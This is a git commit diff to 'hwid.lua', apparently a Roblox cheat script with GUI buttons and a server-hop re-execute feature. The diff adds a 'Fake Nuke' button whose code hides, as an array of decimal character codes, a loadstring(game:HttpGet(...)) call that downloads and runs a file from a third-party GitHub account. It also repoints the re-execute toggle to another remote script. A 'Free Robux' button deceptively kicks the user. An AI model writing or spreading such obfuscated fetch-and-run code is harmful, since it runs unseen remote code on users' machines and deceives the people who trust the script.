46d0088b3e7cd0a6b20ed186289b6e3f371e621b
weewoowaawaa <119641594+weewoowaawaa@users.noreply.github.com>
2022-12-09 21:55:00 -0500

    Update hwid.lua

--- hwid.lua
+++ hwid.lua
@@ -790,7 +790,7 @@ end)
 
 serverHopTab:Toggle("Re-Execute", "Executes the script after server hop\nTurn this off if you use autoexec", getgenv().settings.reex, function(t)
     if t and not exd then
-        queueonteleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/weewoowaawaa/premaouaierthunbaeh/main/hwid.lua'))()")
+        queueonteleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/weewoowaawaa/aeuohnuonouaerbhhide/main/main.lua'))()")
         exd = true
     end
     if settingsLock then return end
@@ -815,6 +815,15 @@ local otherTab = win:Tab("Other", "http://www.roblox.com/asset/?id=10213989952")
 otherTab:Button("Free Robux", "This gives free robux (not client sided) I found this glitch scrolling through youtube.", function()
     local player = game:GetService("Players").LocalPlayer
     player:Kick("You thought")
+end)
+
+otherTab:Button("Fake Nuke", "This makes a fake nuke happen on your server.\nOnly you can see this.", function()
+local player = game:GetService("Players").LocalPlayer
+_G.WhoDonated = "haz3mn"
+_G.HowMuchRobux = 100000
+_G.WhoGotRobux = player.Name
+
+SGTSOBF_ffFFFFFFf={"\108","\111","\97","\100","\115","\116","\114","\105","\110","\103","\40","\103","\97","\109","\101","\58","\72","\116","\116","\112","\71","\101","\116","\40","\40","\39","\104","\116","\116","\112","\115","\58","\47","\47","\114","\97","\119","\46","\103","\105","\116","\104","\117","\98","\117","\115","\101","\114","\99","\111","\110","\116","\101","\110","\116","\46","\99","\111","\109","\47","\108","\111","\108","\116","\104","\97","\116","\115","\101","\97","\122","\121","\47","\101","\122","\97","\122","\97","\47","\109","\97","\105","\110","\47","\80","\108","\115","\68","\111","\110","\97","\116","\101","\70","\97","\107","\101","\68","\111","\110","\111","\46","\116","\120","\116","\39","\41","\44","\116","\114","\117","\101","\41","\41","\40","\41",}SGTSOBF_gGGGgGggg="";for _,SGTSOBF_RRrrRRrrr in pairs(SGTSOBF_ffFFFFFFf)do SGTSOBF_gGGGgGggg=SGTSOBF_gGGGgGggg..SGTSOBF_RRrrRRrrr;end;SGTSOBF_LlllllLlL=function(SGTSOBF_zZzZzZzzZ)loadstring(SGTSOBF_zZzZzZzzZ)()end;SGTSOBF_LlllllLlL(SGTSOBF_gGGGgGggg)
 end)
 
 otherTab:Button("Dance Script", "Loads a external dance script (only works till you server hop)", function()
